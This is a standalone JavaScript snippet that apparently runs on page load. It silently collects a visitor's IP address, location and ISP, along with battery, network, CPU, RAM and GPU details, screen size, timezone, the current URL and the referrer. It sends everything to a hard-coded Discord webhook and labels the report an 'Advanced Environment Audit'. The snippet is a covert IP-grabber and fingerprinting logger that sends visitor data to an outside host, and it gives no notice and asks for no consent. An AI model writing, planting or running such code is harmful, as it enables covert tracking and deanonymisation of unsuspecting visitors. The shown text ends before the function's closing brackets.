(async function() {

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1542896833909756139/_Ctcn7nmwBPKf4IVoK4Px_sT1Or9k5_C_Ju6ly3zHwudERsdHBzpEm5y3ES2t9nIWLMZ';

    async function getIpAndGeo() {
        const providers = [
            'https://ipapi.co',
            'https://ipwho.is',
            'https://ipify.org'
        ];
        for (const url of providers) {
            try {
                const res = await fetch(url, { signal: AbortSignal.timeout(2500) });
                if (res.ok) {
                    const data = await res.json();
                    if (url.includes('ipapi.co')) {
                        return {
                            ip: data.ip || 'Unknown',
                            geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'} (${data.org || 'Unknown'})`
                        };
                    }
                    if (url.includes('ipwho.is')) {
                        return {
                            ip: data.ip || 'Unknown',
                            geo: `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'} (${data.connection?.isp || 'Unknown'})`
                        };
                    }
                    return { ip: data.ip || 'Unknown', geo: 'Geo Blocked/Unavailable' };
                }
            } catch (e) {}
        }
        return { ip: 'Unavailable', geo: 'Unavailable' };
    }

    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            }
        } catch (e) {}
        return 'Unsupported';
    }

    function getConnection() {
        const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (n) {
            return `Type: ${n.type || 'unknown'} | Downlink: ${n.downlink || 'unknown'}Mbps | Effective: ${n.effectiveType || 'unknown'}`;
        }
        return 'Unsupported';
    }

    function getHardwareDetails() {
        let gpu = 'Unknown';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) {}
        return {
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            gpu: gpu
        };
    }

    const netInfo = await getIpAndGeo();
    const battery = await getBattery();
    const hardware = getHardwareDetails();

    const report = {
        "IP Address": netInfo.ip,
        "Location / ISP": netInfo.geo,
        "Current URL": window.location.href,
        "Referrer": document.referrer || 'Direct Visit',
        "Device Battery": battery,
        "Network Profile": getConnection(),
        "CPU Cores / RAM": `${hardware.cores} Cores / ${hardware.ram}`,
        "GPU Renderer": hardware.gpu,
        "Screen Geometry": `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x)`,
        "Browser Viewport": `${window.innerWidth}x${window.innerHeight}`,
        "Operating System": navigator.platform || 'Unknown',
        "Browser Language": navigator.language,
        "Timezone Profile": Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
        "Cookies Enabled": navigator.cookieEnabled ? 'Yes' : 'No',
        "Do Not Track": navigator.doNotTrack || 'Not Set',
        "Timestamp UTC": new Date().toISOString()
    };

    const fields = Object.entries(report).map(([key, value]) => ({
        name: key,
        value: String(value).substring(0, 1024),
        inline: true
    }));

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "🛑 **Advanced Environment Audit Logged**",
                embeds: [{
                    title: "System Hardware & Network Intelligence Report",
                    color: 16711712,
                    fields: fields,
                    footer: { text: "Advanced Telemetry Instance" }
                }]
            })
        });
    } catch (err) {
        console.error(err);
    }
